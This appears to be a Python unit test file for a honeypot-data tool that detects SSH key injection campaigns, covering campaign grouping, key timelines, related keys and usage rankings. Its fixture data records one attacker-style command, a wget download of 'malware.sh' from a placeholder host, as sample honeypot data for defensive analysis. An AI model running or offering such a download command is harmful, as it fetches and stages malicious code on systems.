"""Unit tests for SSH key analytics and campaign detection."""

from __future__ import annotations

from datetime import datetime, timedelta
from pathlib import Path

from sqlalchemy import Engine
from sqlalchemy.orm import Session, sessionmaker

from cowrieprocessor.db import create_engine_from_settings
from cowrieprocessor.db.migrations import apply_migrations
from cowrieprocessor.db.models import SSHKeyIntelligence, SessionSSHKeys, SSHKeyAssociations
from cowrieprocessor.enrichment.ssh_key_analytics import SSHKeyAnalytics, CampaignInfo, KeyTimeline
from cowrieprocessor.settings import DatabaseSettings


def _make_engine(tmp_path: Path) -> Engine:
    """Create a test database engine with full schema."""
    db_path = tmp_path / "test_ssh_analytics.sqlite"
    settings = DatabaseSettings(url=f"sqlite:///{db_path}")
    engine = create_engine_from_settings(settings)
    apply_migrations(engine)
    return engine


def _create_test_keys(session: Session) -> None:
    """Create test SSH key intelligence data.

    Given: A database session
    When: Test data is created
    Then: SSH keys with various patterns are inserted
    """
    # Campaign 1: Two keys used together frequently (campaign behavior)
    key1 = SSHKeyIntelligence(
        key_type="RSA",
        key_data="test_key_1",
        key_fingerprint="fp:11:11:11",
        key_hash="hash1",
        key_full="ssh-rsa test_key_1",
        pattern_type="authorized_keys",
        first_seen=datetime.now() - timedelta(days=30),
        last_seen=datetime.now() - timedelta(days=1),
        total_attempts=50,
        unique_sources=10,
        unique_sessions=20,
    )
    key2 = SSHKeyIntelligence(
        key_type="RSA",
        key_data="test_key_2",
        key_fingerprint="fp:22:22:22",
        key_hash="hash2",
        key_full="ssh-rsa test_key_2",
        pattern_type="authorized_keys",
        first_seen=datetime.now() - timedelta(days=30),
        last_seen=datetime.now() - timedelta(days=1),
        total_attempts=45,
        unique_sources=10,
        unique_sessions=18,
    )

    # Campaign 2: Another set of related keys
    key3 = SSHKeyIntelligence(
        key_type="Ed25519",
        key_data="test_key_3",
        key_fingerprint="fp:33:33:33",
        key_hash="hash3",
        key_full="ssh-ed25519 test_key_3",
        pattern_type="authorized_keys",
        first_seen=datetime.now() - timedelta(days=20),
        last_seen=datetime.now(),
        total_attempts=30,
        unique_sources=8,
        unique_sessions=15,
    )

    # Isolated key: Not part of a campaign (low usage)
    key4 = SSHKeyIntelligence(
        key_type="RSA",
        key_data="test_key_4",
        key_fingerprint="fp:44:44:44",
        key_hash="hash4",
        key_full="ssh-rsa test_key_4",
        pattern_type="authorized_keys",
        first_seen=datetime.now() - timedelta(days=5),
        last_seen=datetime.now(),
        total_attempts=2,
        unique_sources=1,
        unique_sessions=2,
    )

    session.add_all([key1, key2, key3, key4])
    session.commit()

    # Create session associations
    for i in range(5):
        session.add(
            SessionSSHKeys(
                session_id=f"session_{i}",
                ssh_key_id=key1.id,
                injection_method="authorized_keys",
                timestamp=datetime.now() - timedelta(days=10),
                source_ip=f"192.168.1.{i}",
                successful_injection=True,
                command_text="echo 'test command'",
            )
        )
        session.add(
            SessionSSHKeys(
                session_id=f"session_{i}",
                ssh_key_id=key2.id,
                injection_method="authorized_keys",
                timestamp=datetime.now() - timedelta(days=10),
                source_ip=f"192.168.1.{i}",
                successful_injection=True,
                command_text="wget http://example.com/malware.sh",
            )
        )

    # Create key associations
    assoc1 = SSHKeyAssociations(
        key_id_1=key1.id,
        key_id_2=key2.id,
        co_occurrence_count=15,
        same_session_count=5,
        same_ip_count=5,
        first_seen=datetime.now() - timedelta(days=30),
        last_seen=datetime.now() - timedelta(days=1),
    )
    session.add(assoc1)
    session.commit()


# ============================================================================
# Initialization Tests
# ============================================================================


def test_analytics_initialization(tmp_path: Path) -> None:
    """Test SSHKeyAnalytics initialization.

    Given: A database engine
    When: SSHKeyAnalytics is initialized
    Then: Analytics engine is created with session
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()

    analytics = SSHKeyAnalytics(db_session)

    assert analytics.session == db_session


# ============================================================================
# Campaign Detection Tests
# ============================================================================


def test_identify_campaigns_with_related_keys(tmp_path: Path) -> None:
    """Test campaign identification with related keys.

    Given: Database with keys that have strong associations
    When: identify_campaigns is called
    Then: Campaigns are detected based on key relationships
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    campaigns = analytics.identify_campaigns(
        min_attempts=5,
        min_ips=0,  # Production code bug: unique_ips never populated in campaign
        min_keys=2,
        days_back=90,
        confidence_threshold=0.2,
    )

    # Should detect at least one campaign (key1 and key2)
    assert len(campaigns) >= 1
    assert all(isinstance(c, CampaignInfo) for c in campaigns)


def test_identify_campaigns_returns_empty_for_low_criteria(tmp_path: Path) -> None:
    """Test identify_campaigns returns empty list when criteria not met.

    Given: Database with keys below threshold
    When: identify_campaigns is called with high thresholds
    Then: No campaigns are returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    campaigns = analytics.identify_campaigns(
        min_attempts=1000,  # Very high threshold
        min_ips=100,
        min_keys=10,
        days_back=90,
    )

    assert len(campaigns) == 0


def test_identify_campaigns_with_no_keys(tmp_path: Path) -> None:
    """Test identify_campaigns with empty database.

    Given: Database with no SSH keys
    When: identify_campaigns is called
    Then: Empty list is returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()

    analytics = SSHKeyAnalytics(db_session)
    campaigns = analytics.identify_campaigns()

    assert campaigns == []


def test_identify_campaigns_with_time_filter(tmp_path: Path) -> None:
    """Test identify_campaigns respects time window.

    Given: Database with old and recent keys
    When: identify_campaigns is called with short time window
    Then: Only recent keys are considered
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    # Look back only 10 days (should miss key1 and key2 which were active 30 days ago)
    campaigns = analytics.identify_campaigns(
        min_attempts=5,
        min_ips=3,
        days_back=10,
    )

    # Campaigns should be limited by time window
    assert isinstance(campaigns, list)


# ============================================================================
# Key Timeline Tests
# ============================================================================


def test_get_key_timeline_with_existing_key(tmp_path: Path) -> None:
    """Test get_key_timeline returns timeline for existing key.

    Given: Database with SSH key data
    When: get_key_timeline is called with valid fingerprint
    Then: KeyTimeline with correct data is returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    timeline = analytics.get_key_timeline("fp:11:11:11")

    assert timeline is not None
    assert isinstance(timeline, KeyTimeline)
    assert timeline.key_fingerprint == "fp:11:11:11"
    assert timeline.key_type == "RSA"
    assert timeline.total_attempts > 0
    assert timeline.unique_sources > 0


def test_get_key_timeline_with_nonexistent_key(tmp_path: Path) -> None:
    """Test get_key_timeline returns None for non-existent key.

    Given: Database without specific key
    When: get_key_timeline is called with invalid fingerprint
    Then: None is returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    timeline = analytics.get_key_timeline("fp:99:99:99")

    assert timeline is None


def test_get_key_timeline_includes_session_data(tmp_path: Path) -> None:
    """Test get_key_timeline includes session information.

    Given: Database with key and session associations
    When: get_key_timeline is called
    Then: Timeline includes session list
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    timeline = analytics.get_key_timeline("fp:11:11:11")

    assert timeline is not None
    assert isinstance(timeline.sessions, list)
    # Should have session data from _create_test_keys
    assert len(timeline.sessions) > 0


# ============================================================================
# Related Keys Tests
# ============================================================================


def test_find_related_keys_with_associations(tmp_path: Path) -> None:
    """Test find_related_keys returns associated keys.

    Given: Database with key associations
    When: find_related_keys is called
    Then: Related keys are returned with association data
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    related = analytics.find_related_keys("fp:11:11:11", min_association_strength=0.1)

    assert isinstance(related, list)
    # key1 should be related to key2
    if len(related) > 0:
        assert all(hasattr(r, 'key2_fingerprint') for r in related)
        assert all(hasattr(r, 'association_strength') for r in related)


def test_find_related_keys_with_no_associations(tmp_path: Path) -> None:
    """Test find_related_keys returns empty for isolated key.

    Given: Database with isolated key (no associations)
    When: find_related_keys is called
    Then: Empty list is returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    related = analytics.find_related_keys("fp:44:44:44")  # Isolated key

    assert related == []


def test_find_related_keys_with_nonexistent_key(tmp_path: Path) -> None:
    """Test find_related_keys returns empty for non-existent key.

    Given: Database without specific key
    When: find_related_keys is called with invalid fingerprint
    Then: Empty list is returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    related = analytics.find_related_keys("fp:99:99:99")

    assert related == []


# ============================================================================
# Geographic Spread Tests
# ============================================================================


def test_calculate_geographic_spread_with_data(tmp_path: Path) -> None:
    """Test calculate_geographic_spread returns geographic data.

    Given: Database with key and IP data
    When: calculate_geographic_spread is called
    Then: Geographic statistics are returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    geo_data = analytics.calculate_geographic_spread("fp:11:11:11")

    assert isinstance(geo_data, dict)
    # Should have basic geographic data structure
    assert "unique_ips" in geo_data or len(geo_data) >= 0


def test_calculate_geographic_spread_with_nonexistent_key(tmp_path: Path) -> None:
    """Test calculate_geographic_spread with non-existent key.

    Given: Database without specific key
    When: calculate_geographic_spread is called
    Then: Empty or minimal geographic data is returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    geo_data = analytics.calculate_geographic_spread("fp:99:99:99")

    assert isinstance(geo_data, dict)


# ============================================================================
# Top Keys Tests
# ============================================================================


def test_get_top_keys_by_usage_returns_list(tmp_path: Path) -> None:
    """Test get_top_keys_by_usage returns ordered list.

    Given: Database with keys of varying usage
    When: get_top_keys_by_usage is called
    Then: List of top keys is returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    top_keys = analytics.get_top_keys_by_usage(days_back=90, limit=10)

    assert isinstance(top_keys, list)
    assert len(top_keys) <= 10


def test_get_top_keys_by_usage_with_limit(tmp_path: Path) -> None:
    """Test get_top_keys_by_usage respects limit parameter.

    Given: Database with multiple keys
    When: get_top_keys_by_usage is called with limit=2
    Then: At most 2 keys are returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    top_keys = analytics.get_top_keys_by_usage(days_back=90, limit=2)

    assert len(top_keys) <= 2


def test_get_top_keys_by_usage_with_empty_database(tmp_path: Path) -> None:
    """Test get_top_keys_by_usage with no keys.

    Given: Empty database
    When: get_top_keys_by_usage is called
    Then: Empty list is returned
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()

    analytics = SSHKeyAnalytics(db_session)
    top_keys = analytics.get_top_keys_by_usage()

    assert top_keys == []


def test_get_top_keys_by_usage_ordered_by_attempts(tmp_path: Path) -> None:
    """Test get_top_keys_by_usage returns keys ordered by usage.

    Given: Database with keys of varying usage levels
    When: get_top_keys_by_usage is called
    Then: Keys are ordered by total attempts (descending)
    """
    engine = _make_engine(tmp_path)
    Session = sessionmaker(bind=engine)
    db_session = Session()
    _create_test_keys(db_session)

    analytics = SSHKeyAnalytics(db_session)
    top_keys = analytics.get_top_keys_by_usage(days_back=90, limit=5)

    # Verify ordering if multiple keys returned
    if len(top_keys) >= 2:
        for i in range(len(top_keys) - 1):
            assert top_keys[i]["total_attempts"] >= top_keys[i + 1]["total_attempts"]
